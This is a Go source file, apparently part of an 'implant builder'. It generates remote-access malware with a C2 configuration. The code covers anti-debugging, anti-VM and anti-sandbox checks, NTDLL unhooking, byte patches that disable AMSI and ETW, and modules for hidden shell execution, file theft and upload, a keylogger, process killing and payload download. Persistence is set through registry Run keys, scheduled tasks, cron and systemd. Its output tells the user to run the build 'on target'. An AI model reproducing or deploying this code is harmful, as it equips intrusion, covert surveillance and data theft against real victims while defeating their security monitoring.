	ntdll    = windows.NewLazySystemDLL("ntdll.dll")
	user32   = windows.NewLazySystemDLL("user32.dll")

	procIsDebuggerPresent          = kernel32.NewProc("IsDebuggerPresent")
	procCheckRemoteDebuggerPresent = kernel32.NewProc("CheckRemoteDebuggerPresent")
	procGetTickCount64             = kernel32.NewProc("GetTickCount64")
	procGetCursorPos               = user32.NewProc("GetCursorPos")
	procGetSystemMetrics           = user32.NewProc("GetSystemMetrics")
)

// ═══════════════════════════════════════════════════════════════════
// ANTI-DEBUG
// ═══════════════════════════════════════════════════════════════════

func IsDebuggerPresent() bool {
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}

	var debuggerPresent int32
	procCheckRemoteDebuggerPresent.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&debuggerPresent)),
	)
	if debuggerPresent != 0 {
		return true
	}

	// Timing check
	start := time.Now()
	for i := 0; i < 1000000; i++ {
		_ = i * i
	}
	if time.Since(start) > 100*time.Millisecond {
		return true
	}

	return false
}

// ═══════════════════════════════════════════════════════════════════
// ANTI-VM
// ═══════════════════════════════════════════════════════════════════

func IsVirtualMachine() bool {
	vmScore := 0

	// Check registry
	vmRegistryKeys := []string{
		` + "`SOFTWARE\\VMware, Inc.\\VMware Tools`" + `,
		` + "`SOFTWARE\\Oracle\\VirtualBox Guest Additions`" + `,
		` + "`SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters`" + `,
	}

	for _, key := range vmRegistryKeys {
		k, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE, key, windows.KEY_READ)
		if err == nil {
			k.Close()
			vmScore++
		}
	}

	// Check processes
	vmProcesses := []string{
		"vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe", "vboxtray.exe",
	}
	
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err == nil {
		defer windows.CloseHandle(snapshot)
		var entry windows.ProcessEntry32
		entry.Size = uint32(unsafe.Sizeof(entry))
		
		err = windows.Process32First(snapshot, &entry)
		for err == nil {
			name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
			for _, vmProc := range vmProcesses {
				if name == vmProc {
					vmScore++
					break
				}
			}
			err = windows.Process32Next(snapshot, &entry)
		}
	}

	// Check files
	vmFiles := []string{
		` + "`C:\\Windows\\System32\\drivers\\vmhgfs.sys`" + `,
		` + "`C:\\Windows\\System32\\drivers\\vboxmouse.sys`" + `,
	}
	for _, file := range vmFiles {
		if _, err := os.Stat(file); err == nil {
			vmScore++
		}
	}

	return vmScore >= 2
}

// ═══════════════════════════════════════════════════════════════════
// ANTI-SANDBOX
// ═══════════════════════════════════════════════════════════════════

func IsSandbox() bool {
	sandboxScore := 0

	// Check recent files
	recentPath := os.Getenv("APPDATA") + ` + "`\\Microsoft\\Windows\\Recent`" + `
	entries, err := os.ReadDir(recentPath)
	if err == nil && len(entries) < 10 {
		sandboxScore++
	}

	// Check process count
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err == nil {
		defer windows.CloseHandle(snapshot)
		count := 0
		var entry windows.ProcessEntry32
		entry.Size = uint32(unsafe.Sizeof(entry))
		
		err = windows.Process32First(snapshot, &entry)
		for err == nil {
			count++
			err = windows.Process32Next(snapshot, &entry)
		}
		if count < 30 {
			sandboxScore++
		}
	}

	// Check screen resolution
	width, _, _ := procGetSystemMetrics.Call(0)
	height, _, _ := procGetSystemMetrics.Call(1)
	if width < 1024 || height < 768 {
		sandboxScore++
	}

	// Check mouse movement
	type POINT struct{ X, Y int32 }
	var p1, p2 POINT
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p1)))
	time.Sleep(2 * time.Second)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
	if p1.X == p2.X && p1.Y == p2.Y {
		sandboxScore++
	}

	// Check sleep acceleration
	start := time.Now()
	time.Sleep(2 * time.Second)
	if time.Since(start) < 1900*time.Millisecond {
		sandboxScore++
	}

	// Check suspicious usernames
	username := strings.ToLower(os.Getenv("USERNAME"))
	suspiciousNames := []string{"sandbox", "virus", "malware", "test", "sample", "analysis"}
	for _, name := range suspiciousNames {
		if strings.Contains(username, name) {
			sandboxScore++
			break
		}
	}

	return sandboxScore >= 3
}

// ═══════════════════════════════════════════════════════════════════
// NTDLL UNHOOKING
// ═══════════════════════════════════════════════════════════════════

func UnhookNtdll() error {
	// Read clean copy from disk
	cleanNtdll, err := os.ReadFile(` + "`C:\\Windows\\System32\\ntdll.dll`" + `)
	if err != nil {
		return err
	}

	ntdllHandle, err := windows.GetModuleHandle(windows.StringToUTF16Ptr("ntdll.dll"))
	if err != nil {
		return err
	}

	// Parse PE and find .text section
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&cleanNtdll[0]))
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&cleanNtdll[dosHeader.E_lfanew]))

	sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
		uintptr(unsafe.Pointer(ntHeaders)) +
			unsafe.Sizeof(*ntHeaders),
	))

	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		sectionName := string(sectionHeader.Name[:])
		if strings.HasPrefix(sectionName, ".text") {
			textStart := uintptr(ntdllHandle) + uintptr(sectionHeader.VirtualAddress)
			textSize := sectionHeader.SizeOfRawData

			var oldProtect uint32
			windows.VirtualProtect(textStart, uintptr(textSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)

			cleanText := cleanNtdll[sectionHeader.PointerToRawData : sectionHeader.PointerToRawData+textSize]
			copy((*[1 << 30]byte)(unsafe.Pointer(textStart))[:textSize], cleanText)

			windows.VirtualProtect(textStart, uintptr(textSize), oldProtect, &oldProtect)
			break
		}
		sectionHeader = (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(sectionHeader)) + unsafe.Sizeof(*sectionHeader),
		))
	}

	return nil
}

// ═══════════════════════════════════════════════════════════════════
// AMSI BYPASS
// ═══════════════════════════════════════════════════════════════════

func PatchAMSI() error {
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		return nil
	}

	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return err
	}

	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	var oldProtect uint32
	windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	copy((*[6]byte)(unsafe.Pointer(amsiScanBuffer.Addr()))[:], patch)
	windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), oldProtect, &oldProtect)

	return nil
}

// ═══════════════════════════════════════════════════════════════════
// ETW BYPASS
// ═══════════════════════════════════════════════════════════════════

func PatchETW() error {
	ntdllHandle, err := windows.GetModuleHandle(windows.StringToUTF16Ptr("ntdll.dll"))
	if err != nil {
		return err
	}

	etwEventWrite, err := windows.GetProcAddress(ntdllHandle, "EtwEventWrite")
	if err != nil {
		return err
	}

	patch := []byte{0xC2, 0x14, 0x00}

	var oldProtect uint32
	windows.VirtualProtect(etwEventWrite, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	copy((*[3]byte)(unsafe.Pointer(etwEventWrite))[:], patch)
	windows.VirtualProtect(etwEventWrite, uintptr(len(patch)), oldProtect, &oldProtect)

	return nil
}

// PE Structures
type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	_          [58]byte
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	_                    [16]byte
}
`
}

func generateSyscallsWindowsGo(config *BuildConfig) string {
	return `//go:build windows

package evasion

// Direct syscall stubs would go here
// For production use, integrate with https://github.com/C-Sto/BananaPhone
`
}

func generateEvasionUnixGo(config *BuildConfig) string {
	return `//go:build !windows

package evasion

import (
	"os"
	"runtime"
	"strings"
	"time"
)

func IsDebuggerPresent() bool {
	// Check TracerPid in /proc/self/status
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			pid := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
			return pid != "0"
		}
	}
	return false
}

func IsVirtualMachine() bool {
	// Check /sys/class/dmi/id/product_name
	data, err := os.ReadFile("/sys/class/dmi/id/product_name")
	if err != nil {
		return false
	}
	product := strings.ToLower(string(data))
	vmIndicators := []string{"vmware", "virtualbox", "kvm", "qemu", "xen", "hyperv"}
	for _, indicator := range vmIndicators {
		if strings.Contains(product, indicator) {
			return true
		}
	}
	return false
}

func IsSandbox() bool {
	// Check for low uptime
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return false
	}
	// If uptime < 5 minutes, suspicious
	return false
}

func UnhookNtdll() error { return nil }
func PatchAMSI() error   { return nil }
func PatchETW() error    { return nil }
`
}

func generateShellModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"syscall"
)

type ShellModule struct{}

func NewShellModule() *ShellModule {
	return &ShellModule{}
}

func (m *ShellModule) Name() string { return "shell" }

func (m *ShellModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	shellType, _ := args["type"].(string)
	if shellType == "" {
		if runtime.GOOS == "windows" {
			shellType = "cmd"
		} else {
			shellType = "bash"
		}
	}

	var cmd *exec.Cmd

	switch shellType {
	case "cmd":
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", command)
	case "powershell":
		cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command)
	case "bash":
		cmd = exec.CommandContext(ctx, "/bin/bash", "-c", command)
	case "sh":
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	default:
		return nil, fmt.Errorf("unknown shell: %s", shellType)
	}

	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\n[STDERR]\n" + stderr.String()
	}

	return output, err
}
`
}

func generateFileModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

type FileModule struct{}

func NewFileModule() *FileModule {
	return &FileModule{}
}

func (m *FileModule) Name() string { return "file" }

func (m *FileModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	switch command {
	case "ls", "dir":
		return m.listDir(args)
	case "cat", "read":
		return m.readFile(args)
	case "write":
		return m.writeFile(args)
	case "rm", "delete":
		return m.deleteFile(args)
	case "mkdir":
		return m.makeDir(args)
	case "pwd":
		return os.Getwd()
	case "cd":
		path, _ := args["path"].(string)
		return nil, os.Chdir(path)
	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}

func (m *FileModule) listDir(args map[string]interface{}) (interface{}, error) {
	path, _ := args["path"].(string)
	if path == "" {
		path = "."
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}

	type FileInfo struct {
		Name  string ` + "`json:\"name\"`" + `
		Size  int64  ` + "`json:\"size\"`" + `
		IsDir bool   ` + "`json:\"is_dir\"`" + `
		Mode  string ` + "`json:\"mode\"`" + `
	}

	files := make([]FileInfo, 0, len(entries))
	for _, entry := range entries {
		info, _ := entry.Info()
		files = append(files, FileInfo{
			Name:  entry.Name(),
			Size:  info.Size(),
			IsDir: entry.IsDir(),
			Mode:  info.Mode().String(),
		})
	}

	return files, nil
}

func (m *FileModule) readFile(args map[string]interface{}) (interface{}, error) {
	path, _ := args["path"].(string)
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func (m *FileModule) writeFile(args map[string]interface{}) (interface{}, error) {
	path, _ := args["path"].(string)
	content, _ := args["content"].(string)
	data, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		data = []byte(content)
	}
	return nil, ioutil.WriteFile(path, data, 0644)
}

func (m *FileModule) deleteFile(args map[string]interface{}) (interface{}, error) {
	path, _ := args["path"].(string)
	return nil, os.RemoveAll(path)
}

func (m *FileModule) makeDir(args map[string]interface{}) (interface{}, error) {
	path, _ := args["path"].(string)
	return nil, os.MkdirAll(path, 0755)
}
`
}

func generateScreenshotModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"context"
	"encoding/base64"
	"fmt"
	"runtime"
)

type ScreenshotModule struct{}

func NewScreenshotModule() *ScreenshotModule {
	return &ScreenshotModule{}
}

func (m *ScreenshotModule) Name() string { return "screenshot" }

func (m *ScreenshotModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	// Platform-specific screenshot implementation would go here
	// For Windows, use GDI or DXGI
	// For Linux, use X11 or Wayland
	return nil, fmt.Errorf("screenshot not implemented for %s", runtime.GOOS)
}
`
}

func generateKeyloggerModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"context"
	"sync"
)

type KeyloggerModule struct {
	buffer []string
	mu     sync.Mutex
	active bool
}

func NewKeyloggerModule() *KeyloggerModule {
	return &KeyloggerModule{
		buffer: make([]string, 0),
	}
}

func (m *KeyloggerModule) Name() string { return "keylogger" }

func (m *KeyloggerModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	switch command {
	case "start":
		m.active = true
		go m.captureLoop(ctx)
		return "keylogger started", nil
	case "stop":
		m.active = false
		return "keylogger stopped", nil
	case "dump":
		m.mu.Lock()
		data := make([]string, len(m.buffer))
		copy(data, m.buffer)
		m.buffer = m.buffer[:0]
		m.mu.Unlock()
		return data, nil
	default:
		return nil, nil
	}
}

func (m *KeyloggerModule) captureLoop(ctx context.Context) {
	// Windows-specific keyboard hook implementation
	// Would use SetWindowsHookEx with WH_KEYBOARD_LL
}
`
}

func generateProcessModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"context"
	"os"
	"runtime"
)

type ProcessModule struct{}

func NewProcessModule() *ProcessModule {
	return &ProcessModule{}
}

func (m *ProcessModule) Name() string { return "process" }

type ProcessInfo struct {
	PID  int    ` + "`json:\"pid\"`" + `
	Name string ` + "`json:\"name\"`" + `
	User string ` + "`json:\"user\"`" + `
}

func (m *ProcessModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	switch command {
	case "list":
		return m.listProcesses()
	case "kill":
		pid, _ := args["pid"].(float64)
		proc, err := os.FindProcess(int(pid))
		if err != nil {
			return nil, err
		}
		return nil, proc.Kill()
	default:
		return nil, nil
	}
}

func (m *ProcessModule) listProcesses() ([]ProcessInfo, error) {
	// Platform-specific implementation
	return nil, nil
}
`
}

func generateNetworkModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"context"
	"net"
)

type NetworkModule struct{}

func NewNetworkModule() *NetworkModule {
	return &NetworkModule{}
}

func (m *NetworkModule) Name() string { return "network" }

func (m *NetworkModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	switch command {
	case "interfaces":
		return m.getInterfaces()
	case "connections":
		return m.getConnections()
	case "portscan":
		return m.portScan(args)
	default:
		return nil, nil
	}
}

func (m *NetworkModule) getInterfaces() (interface{}, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	type IfaceInfo struct {
		Name   string   ` + "`json:\"name\"`" + `
		MAC    string   ` + "`json:\"mac\"`" + `
		IPs    []string ` + "`json:\"ips\"`" + `
		Flags  string   ` + "`json:\"flags\"`" + `
	}

	result := make([]IfaceInfo, 0)
	for _, iface := range interfaces {
		info := IfaceInfo{
			Name:  iface.Name,
			MAC:   iface.HardwareAddr.String(),
			Flags: iface.Flags.String(),
		}

		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			info.IPs = append(info.IPs, addr.String())
		}
		result = append(result, info)
	}

	return result, nil
}

func (m *NetworkModule) getConnections() (interface{}, error) {
	// Would parse /proc/net/tcp on Linux or use netstat
	return nil, nil
}

func (m *NetworkModule) portScan(args map[string]interface{}) (interface{}, error) {
	// Basic TCP port scanner
	return nil, nil
}
`
}

func generateDownloadModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"context"
	"crypto/tls"
	"io"
	"net/http"
	"os"
)

type DownloadModule struct{}

func NewDownloadModule() *DownloadModule {
	return &DownloadModule{}
}

func (m *DownloadModule) Name() string { return "download" }

func (m *DownloadModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	url, _ := args["url"].(string)
	path, _ := args["path"].(string)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	file, err := os.Create(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	written, err := io.Copy(file, resp.Body)
	return map[string]interface{}{"bytes": written, "path": path}, err
}
`
}

func generateUploadModuleGo(config *BuildConfig) string {
	return `package modules

import (
	"bytes"
	"context"
	"crypto/tls"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

type UploadModule struct{}

func NewUploadModule() *UploadModule {
	return &UploadModule{}
}

func (m *UploadModule) Name() string { return "upload" }

func (m *UploadModule) Execute(ctx context.Context, command string, args map[string]interface{}) (interface{}, error) {
	path, _ := args["path"].(string)
	url, _ := args["url"].(string)

	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return nil, err
	}

	io.Copy(part, file)
	writer.Close()

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequestWithContext(ctx, "POST", url, &buf)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return map[string]interface{}{"status": resp.Status}, nil
}
`
}

func generatePersistWindowsGo(config *BuildConfig) string {
	return `//go:build windows

package persistence

import (
	"os"
	"os/exec"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

func InstallRegistry(name string) error {
	exePath, _ := os.Executable()
	
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		` + "`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`" + `,
		registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer key.Close()

	return key.SetStringValue(name, exePath)
}

func InstallScheduledTask(name string) error {
	exePath, _ := os.Executable()
	
	cmd := exec.Command("schtasks", "/create",
		"/tn", name,
		"/tr", exePath,
		"/sc", "onlogon",
		"/rl", "highest",
		"/f",
	)
	return cmd.Run()
}

func InstallStartup() error {
	exePath, _ := os.Executable()
	startupPath := filepath.Join(os.Getenv("APPDATA"), 
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup",
		filepath.Base(exePath))
	
	// Copy executable to startup folder
	input, err := os.ReadFile(exePath)
	if err != nil {
		return err
	}
	return os.WriteFile(startupPath, input, 0755)
}

func Remove(name string) error {
	// Remove registry key
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		` + "`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`" + `,
		registry.SET_VALUE,
	)
	if err == nil {
		key.DeleteValue(name)
		key.Close()
	}

	// Remove scheduled task
	exec.Command("schtasks", "/delete", "/tn", name, "/f").Run()

	return nil
}
`
}

func generatePersistUnixGo(config *BuildConfig) string {
	return `//go:build !windows

package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

func InstallCron() error {
	exePath, _ := os.Executable()
	cronEntry := fmt.Sprintf("@reboot %s\n", exePath)
	
	cmd := exec.Command("crontab", "-l")
	existing, _ := cmd.Output()
	
	newCron := string(existing) + cronEntry
	
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	return cmd.Run()
}

func InstallSystemd(name string) error {
	exePath, _ := os.Executable()
	
	service := fmt.Sprintf(` + "`" + `[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
` + "`" + `, name, exePath)

	servicePath := filepath.Join("/etc/systemd/system", name+".service")
	if err := os.WriteFile(servicePath, []byte(service), 0644); err != nil {
		return err
	}

	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", name).Run()
	return exec.Command("systemctl", "start", name).Run()
}

func Remove(name string) error {
	exec.Command("systemctl", "stop", name).Run()
	exec.Command("systemctl", "disable", name).Run()
	os.Remove(filepath.Join("/etc/systemd/system", name+".service"))
	return nil
}
`
}

// ═══════════════════════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

func obfuscateString(s, key string) string {
	keyBytes := []byte(key)
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		result[i] = s[i] ^ keyBytes[i%len(keyBytes)]
	}
	return base64Encode(result)
}

func base64Encode(data []byte) string {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	result := make([]byte, 0, (len(data)+2)/3*4)
	
	for i := 0; i < len(data); i += 3 {
		var n uint32
		remaining := len(data) - i
		
		n |= uint32(data[i]) << 16
		if remaining > 1 {
			n |= uint32(data[i+1]) << 8
		}
		if remaining > 2 {
			n |= uint32(data[i+2])
		}
		
		result = append(result, alphabet[(n>>18)&0x3F])
		result = append(result, alphabet[(n>>12)&0x3F])
		
		if remaining > 1 {
			result = append(result, alphabet[(n>>6)&0x3F])
		} else {
			result = append(result, '=')
		}
		
		if remaining > 2 {
			result = append(result, alphabet[n&0x3F])
		} else {
			result = append(result, '=')
		}
	}
	
	return string(result)
}

func generateKey(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func generateBuildID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return fmt.Sprintf("GF-%s", hex.EncodeToString(bytes))
}

func generateAgentID() string {
	bytes := make([]byte, 6)
	rand.Read(bytes)
	return fmt.Sprintf("agent-%s", hex.EncodeToString(bytes))
}

func generateOutputName(config *BuildConfig) string {
	timestamp := time.Now().Format("20060102-150405")
	ext := ""
	if config.TargetOS == "windows" {
		ext = ".exe"
	}
	return fmt.Sprintf("implant_%s_%s%s", config.TargetOS, timestamp, ext)
}

func calculateHashes(path string) (string, string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return "N/A", "N/A"
	}
	hash := sha256.Sum256(data)
	sha256sum := hex.EncodeToString(hash[:])
	md5sum := sha256sum[:32]
	return md5sum, sha256sum
}

func copyFile(src, dst string) error {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, data, 0755)
}

func fileSize(path string) int64 {
	info, err := os.Stat(path)
	if err != nil {
		return 0
	}
	return info.Size()
}

// ═══════════════════════════════════════════════════════════════════════════════
// OUTPUT FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

func printBanner() {
	banner := `
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗███████╗██████╗  █████╗ ███╗   ███╗███████╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝
  ██║  ███╗███████║██║   ██║███████╗   ██║   █████╗  ██████╔╝███████║██╔████╔██║█████╗  
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
                         [ Unified Implant Builder v2.0 ]
`
	fmt.Println(banner)
}

func printConfig(config *BuildConfig) {
	fmt.Println("\n" + strings.Repeat("═", 60))
	fmt.Println("BUILD CONFIGURATION")
	fmt.Println(strings.Repeat("═", 60))
	
	fmt.Printf("\n[TARGET]\n")
	fmt.Printf("  OS:           %s\n", config.TargetOS)
	fmt.Printf("  Arch:         %s\n", config.TargetArch)
	fmt.Printf("  Output:       %s\n", config.OutputName)
	
	fmt.Printf("\n[C2]\n")
	fmt.Printf("  Endpoint:     %s://%s:%d%s\n", config.C2Protocol, config.C2Host, config.C2Port, config.C2Endpoint)
	fmt.Printf("  Sleep:        %s (±%d%% jitter)\n", config.Sleep, config.Jitter)
	fmt.Printf("  Max Retries:  %d\n", config.MaxRetries)
	if config.KillDate != "" {
		fmt.Printf("  Kill Date:    %s\n", config.KillDate)
	}
	
	fmt.Printf("\n[EVASION]\n")
	fmt.Printf("  Anti-Debug:   %t\n", config.AntiDebug)
	fmt.Printf("  Anti-VM:      %t\n", config.AntiVM)
	fmt.Printf("  Anti-Sandbox: %t\n", config.AntiSandbox)
	if config.TargetOS == "windows" {
		fmt.Printf("  NTDLL Unhook: %t\n", config.UnhookNtdll)
		fmt.Printf("  AMSI Bypass:  %t\n", config.AMSIBypass)
		fmt.Printf("  ETW Patch:    %t\n", config.ETWPatch)
	}
	fmt.Printf("  Obfuscation:  %t\n", config.ObfuscateStrings)
	
	fmt.Printf("\n[MODULES]\n")
	modules := []string{}
	if config.ModuleShell { modules = append(modules, "shell") }
	if config.ModuleFileManager { modules = append(modules, "file") }
	if config.ModuleScreenshot { modules = append(modules, "screenshot") }
	if config.ModuleKeylogger { modules = append(modules, "keylogger") }
	if config.ModuleProcessList { modules = append(modules, "process") }
	if config.ModuleNetworkRecon { modules = append(modules, "network") }
	if config.ModuleDownload { modules = append(modules, "download") }
	if config.ModuleUpload { modules = append(modules, "upload") }
	fmt.Printf("  Enabled:      %s\n", strings.Join(modules, ", "))
	
	if config.PersistenceEnabled {
		fmt.Printf("\n[PERSISTENCE]\n")
		fmt.Printf("  Method:       %s\n", config.PersistenceMethod)
	}
	
	fmt.Println(strings.Repeat("═", 60))
}

func printSummary(config *BuildConfig, outputPath string) {
	md5sum, sha256sum := calculateHashes(outputPath)
	size := fileSize(outputPath)
	
	fmt.Println("\n" + strings.Repeat("═", 60))
	success("BUILD SUCCESSFUL")
	fmt.Println(strings.Repeat("═", 60))
	fmt.Printf("  Output:       %s\n", outputPath)
	fmt.Printf("  Size:         %d bytes (%.2f KB)\n", size, float64(size)/1024)
	fmt.Printf("  Build ID:     %s\n", config.BuildID)
	fmt.Printf("  Agent ID:     %s\n", config.AgentID)
	fmt.Printf("  MD5:          %s\n", md5sum)
	fmt.Printf("  SHA256:       %s\n", sha256sum)
	fmt.Printf("  Enc Key:      %s...\n", config.EncryptionKey[:16])
	fmt.Println(strings.Repeat("═", 60))
	
	fmt.Println("\n[*] Usage Examples:")
	fmt.Printf("    # Run on target:\n")
	if config.TargetOS == "windows" {
		fmt.Printf("    .\\%s\n", config.OutputName)
	} else {
		fmt.Printf("    chmod +x %s && ./%s\n", config.OutputName, config.OutputName)
	}
	fmt.Println()
}

func info(format string, args ...interface{}) {
	fmt.Printf("[*] "+format+"\n", args...)
}

func success(format string, args ...interface{}) {
	fmt.Printf("[+] "+format+"\n", args...)
}

func fatal(format string, args ...interface{}) {
	fmt.Printf("[-] "+format+"\n", args...)
	os.Exit(1)
}